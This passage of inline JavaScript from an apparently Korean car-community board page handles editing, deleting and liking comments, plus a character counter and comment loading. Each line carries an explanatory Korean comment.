			tmp.innerHTML = current;   // textarea 에 HTML 을 넣으면 브라우저가 엔티티를 원래 글자로 풀어 준다
			current = tmp.value;   // 그 풀린 글자를 꺼낸다. 이것이 사용자가 원래 쓴 내용이다

			slot.innerHTML =   // 수정용 입력칸과 버튼을 만들어 넣는다
				'<div class="comment-form comment-form-sm">'
			  +   '<textarea class="form-control" rows="3" maxlength="1000" id="ed-' + cIdx + '"></textarea>'
			  +   '<div class="comment-form-foot">'
			  +     '<button type="button" class="btn btn-ghost btn-sm" onclick="closeSlot(' + cIdx + ')">취소</button>'
			  +     '<button type="button" class="btn btn-primary btn-sm" onclick="submitEdit(' + cIdx + ')">수정 완료</button>'
			  +   '</div>'
			  + '</div>';

			var box = document.getElementById("ed-" + cIdx);   // 새로 만든 수정 입력칸을 찾는다
			box.value = current;   // 원래 내용을 채워 준다 (처음부터 다시 쓰지 않아도 되게)
			box.focus();   // 커서를 놓아 준다
		}

		function submitEdit(cIdx){   // 수정 완료 버튼이 부르는 함수

			var content = document.getElementById("ed-" + cIdx).value;   // 수정 입력칸의 내용을 읽는다

			if(!content || content.trim() === ""){   // 내용이 비어 있거나 공백뿐이면
				alert("내용을 입력해주세요.");   // 입력해 달라고 알린다
				return;   // 여기서 끝낸다
			}

			CarApp.postForm(ctx + "/Board/commentEdit.do", { c_idx : cIdx, content : content })   // 댓글 수정 주소로 보낸다
				.then(function(text){
					var res = JSON.parse(text);   // 받은 글자를 JSON 객체로 바꾼다
					if(!res.ok){ alert(res.message); return; }   // 서버가 실패라고 답했으면 이유를 알리고 끝낸다
					loadComments();   // 목록을 다시 불러와 수정된 내용이 보이게 한다
				})
				.catch(function(err){ alert("수정 실패 : " + err.message); });   // 통신 자체가 실패하면 이유를 알린다
		}

		// ----- 댓글 삭제 -----
		function removeComment(cIdx){

			if(!window.confirm("이 댓글을 삭제하시겠어요?")){ return; }   // 확인창에서 "취소" 를 누르면 아무것도 하지 않는다

			CarApp.postForm(ctx + "/Board/commentDelete.do", { c_idx : cIdx })   // 댓글 삭제 주소로 보낸다
				.then(function(text){
					var res = JSON.parse(text);   // 받은 글자를 JSON 객체로 바꾼다
					if(!res.ok){ alert(res.message); return; }   // 서버가 실패라고 답했으면 이유를 알리고 끝낸다
					loadComments();   // 목록을 다시 불러와 삭제 결과가 보이게 한다
				})
				.catch(function(err){ alert("삭제 실패 : " + err.message); });   // 통신 자체가 실패하면 이유를 알린다
		}

		// ----- 추천 (누르면 추천, 다시 누르면 취소) -----
		function toggleLike(cIdx){

			CarApp.postForm(ctx + "/Board/commentLike.do", { c_idx : cIdx })   // 댓글 추천 주소로 보낸다
				.then(function(text){
					var res = JSON.parse(text);   // 받은 글자를 JSON 객체로 바꾼다
					if(!res.ok){ alert(res.message); return; }   // 서버가 실패라고 답했으면 이유를 알리고 끝낸다

					// 목록 전체를 다시 그리지 않고 그 댓글의 숫자와 색만 바꾼다 (읽던 위치가 유지된다)
					document.getElementById("cl-" + cIdx).textContent = res.likeCount;

					var btn = document.querySelector('#c-' + cIdx + ' .comment-like');   // 그 댓글의 추천 버튼을 찾는다
					if(btn){   // 버튼이 있으면
						if(res.liked){ btn.classList.add("is-liked"); }   // 추천 상태면 색이 채워지는 클래스를 붙인다
						else         { btn.classList.remove("is-liked"); }   // 추천을 취소했으면 그 클래스를 뗀다
					}
				})
				.catch(function(err){ alert("추천 실패 : " + err.message); });   // 통신 자체가 실패하면 이유를 알린다
		}

		// ----- 댓글 쓰기 버튼 / 글자수 표시 -----
		(function(){
			var submitBtn = document.getElementById("commentSubmit");   // 댓글 등록 버튼을 찾는다
			var input     = document.getElementById("commentInput");   // 댓글 입력칸을 찾는다

			// 비로그인 상태에서는 입력칸이 아예 출력되지 않는다
			if(submitBtn && input){
				submitBtn.addEventListener("click", function(){
					addComment(null, input.value, null);   // 입력한 내용으로 댓글을 등록한다 (부모 없음 = 최상위 댓글)
				});
				input.addEventListener("input", function(){   // 입력칸에 글자를 칠 때마다 실행할 동작을 등록한다
					document.getElementById("commentLen").textContent = input.value.length;   // 지금까지 친 글자 수를 화면에 표시한다
				});
			}

			/* 화면이 열리면 댓글을 불러온다.

			   [DOMContentLoaded 를 기다리는 이유]
			     loadComments() 는 CarApp.postForm 을 쓴다.
			     app.js 는 defer 로 불러오므로 HTML 을 다 읽은 뒤에 실행된다.
			     defer 스크립트는 DOMContentLoaded 보다 먼저 끝나므로,
			     그 시점을 기다리면 CarApp 이 반드시 준비되어 있다. */
			if (document.readyState === "loading") {
				document.addEventListener("DOMContentLoaded", loadComments);
			} else {
				//이미 다 읽힌 뒤라면 바로 호출한다
				loadComments();
			}
		})();   // 이 괄호가 위에서 시작한 함수를 "바로 실행" 시킨다
	</script>
	
	
















